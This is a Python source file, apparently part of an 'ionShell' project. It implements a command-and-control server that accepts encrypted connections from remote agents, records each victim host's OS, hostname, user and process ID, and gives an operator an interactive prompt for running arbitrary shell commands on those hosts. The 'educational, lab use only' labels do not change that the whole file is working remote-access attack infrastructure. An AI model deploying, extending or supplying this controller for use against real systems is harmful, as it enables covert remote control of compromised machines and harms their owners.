
---

### File: `/ionshell/controller/controller.py`

```python
#!/usr/bin/env python3
"""
ionShell Controller (C2 Server)
Educational use only — lab environments only.

Responsibilities:
- Listen for agent connections
- Manage multiple agents
- Provide interactive CLI per agent
- Encrypt/decrypt messages
- Enforce explicit operator commands
"""

import argparse
import base64
import json
import os
import select
import socket
import sys
import threading
import time
from datetime import datetime
from typing import Dict, Optional, Tuple

# Local modules
from . import crypto, protocol


class Agent:
    """Represents a connected agent (beacon)."""
    def __init__(self, conn: socket.socket, addr: Tuple[str, int]):
        self.conn = conn
        self.addr = addr
        self.id = f"{addr[0]}:{addr[1]}"
        self.metadata = {}
        self.connected_at = datetime.now()
        self.last_seen = self.connected_at
        self.active = True

    def send_message(self, msg: dict) -> bool:
        """Send encrypted message to agent."""
        try:
            encrypted = crypto.encrypt_message(msg, self.psk)
            self.conn.sendall(len(encrypted).to_bytes(4, 'big') + encrypted)
            return True
        except Exception as e:
            print(f"[!] Agent {self.id} send error: {e}", file=sys.stderr)
            self.active = False
            return False

    def recv_message(self) -> Optional[dict]:
        """Receive and decrypt message from agent."""
        try:
            # Read 4-byte length header
            raw_len = self.conn.recv(4)
            if not raw_len:
                return None
            msg_len = int.from_bytes(raw_len, 'big')
            if msg_len > 1024 * 1024:  # 1MB max
                raise ValueError("Message too large")
            encrypted = self.conn.recv(msg_len)
            if not encrypted:
                return None
            return crypto.decrypt_message(encrypted, self.psk)
        except Exception as e:
            print(f"[!] Agent {self.id} recv error: {e}", file=sys.stderr)
            self.active = False
            return None


class Controller:
    def __init__(self, port: int, psk: bytes):
        self.port = port
        self.psk = psk
        self.agents: Dict[str, Agent] = {}
        self.lock = threading.Lock()
        self.running = True

    def start_server(self):
        """Start listening for agent connections."""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind(("", self.port))
        server_sock.listen(5)
        print(f"[+] Controller listening on :{self.port}")
        print(f"[i] PSK (hex): {self.psk.hex()}")
        print("[i] Waiting for agents...")

        try:
            while self.running:
                # Use select to allow graceful shutdown
                ready, _, _ = select.select([server_sock], [], [], 1.0)
                if ready:
                    conn, addr = server_sock.accept()
                    threading.Thread(
                        target=self.handle_agent,
                        args=(conn, addr),
                        daemon=True
                    ).start()
        except KeyboardInterrupt:
            print("\n[!] Shutting down controller...")
        finally:
            server_sock.close()
            with self.lock:
                for agent in self.agents.values():
                    agent.conn.close()

    def handle_agent(self, conn: socket.socket, addr: Tuple[str, int]):
        """Handle a new agent connection."""
        agent = Agent(conn, addr)
        agent.psk = self.psk  # PSK is shared out-of-band

        # Expect initial handshake
        hello = agent.recv_message()
        if not hello or hello.get("type") != "hello":
            print(f"[!] Invalid handshake from {addr}", file=sys.stderr)
            conn.close()
            return

        # Store agent metadata
        agent.metadata = {
            "os": hello.get("os", "unknown"),
            "hostname": hello.get("hostname", "unknown"),
            "user": hello.get("user", "unknown"),
            "pid": hello.get("pid", "unknown"),
        }

        with self.lock:
            self.agents[agent.id] = agent

        print(f"\n[+] Agent connected: {agent.metadata['hostname']} "
              f"({agent.metadata['user']}, {agent.metadata['os']})")
        self.interactive_shell(agent.id)

    def interactive_shell(self, agent_id: str):
        """Start interactive CLI for an agent."""
        with self.lock:
            agent = self.agents.get(agent_id)
            if not agent or not agent.active:
                return

        # Show prompt context
        host = agent.metadata["hostname"]
        user = agent.metadata["user"]
        prompt = f"ionshell [{host}:{user}]> "

        try:
            while self.running and agent.active:
                try:
                    cmd = input(prompt).strip()
                    if not cmd:
                        continue

                    # Built-in controller commands
                    if cmd == "exit" or cmd == "quit":
                        print("[i] Disconnecting agent...")
                        agent.send_message({"type": "disconnect"})
                        break
                    elif cmd == "info":
                        self.show_agent_info(agent)
                        continue
                    elif cmd == "help":
                        self.show_help()
                        continue

                    # Send command to agent
                    if cmd.startswith("exec "):
                        # Explicit exec required for safety
                        real_cmd = cmd[5:].strip()
                        if not real_cmd:
                            print("[!] Usage: exec <command>")
                            continue
                        agent.send_message({
                            "type": "command",
                            "cmd": real_cmd
                        })
                    else:
                        print("[!] Unknown command. Type 'help' for options.")
                        continue

                    # Wait for response (with timeout)
                    response = agent.recv_message()
                    if response:
                        self.handle_agent_response(response)
                    else:
                        print("[!] Agent disconnected.")
                        break

                except (EOFError, KeyboardInterrupt):
                    print("\n[i] Use 'exit' to disconnect cleanly.")
        finally:
            with self.lock:
                if agent_id in self.agents:
                    del self.agents[agent_id]
            agent.conn.close()
            print(f"[i] Agent {agent_id} session ended.")

    def handle_agent_response(self, msg: dict):
        """Process message from agent."""
        msg_type = msg.get("type")
        if msg_type == "result":
            stdout = msg.get("stdout", "")
            stderr = msg.get("stderr", "")
            exit_code = msg.get("exit_code", -1)
            if stdout:
                print(stdout)
            if stderr:
                print(stderr, file=sys.stderr)
            if exit_code != 0:
                print(f"[!] Exit code: {exit_code}", file=sys.stderr)
        elif msg_type == "error":
            print(f"[!] Agent error: {msg.get('msg', 'unknown')}", file=sys.stderr)
        elif msg_type == "disconnect":
            print("[i] Agent requested disconnect.")
        else:
            print(f"[?] Unknown message type: {msg_type}", file=sys.stderr)

    def show_agent_info(self, agent):
        """Display agent metadata."""
        print("\n=== Agent Info ===")
        print(f"ID:       {agent.id}")
        print(f"IP:Port:  {agent.addr[0]}:{agent.addr[1]}")
        print(f"Connected:{agent.connected_at.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"OS:       {agent.metadata.get('os', 'N/A')}")
        print(f"Hostname: {agent.metadata.get('hostname', 'N/A')}")
        print(f"User:     {agent.metadata.get('user', 'N/A')}")
        print(f"PID:      {agent.metadata.get('pid', 'N/A')}")
        print("==================\n")

    def show_help(self):
        """Show help text."""
        print("""
ionShell Controller Commands:
  exec <cmd>    Execute command on agent (e.g., 'exec pwd')
  info          Show agent metadata
  exit / quit   Disconnect current agent
  help          Show this help

Note: All commands require explicit 'exec' prefix for safety.
""")


def main():
    parser = argparse.ArgumentParser(description="ionShell Controller (C2 Server) — Educational Use Only")
    parser.add_argument("--port", "-p", type=int, default=8080,
                        help="Port to listen on (default: 8080)")
    parser.add_argument("--psk", "-k", required=True,
                        help="Pre-shared key (64 hex chars, 32 bytes)")
    
    args = parser.parse_args()

    # Validate PSK
    try:
        psk = bytes.fromhex(args.psk)
        if len(psk) != 32:
            raise ValueError("PSK must be 32 bytes (64 hex chars)")
    except Exception as e:
        print(f"[!] Invalid PSK: {e}", file=sys.stderr)
        sys.exit(1)

    print("[i] ionShell Controller v0.1 (edu)")
    print("[i] For authorized lab use only.\n")

    controller = Controller(args.port, psk)
    try:
        controller.start_server()
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()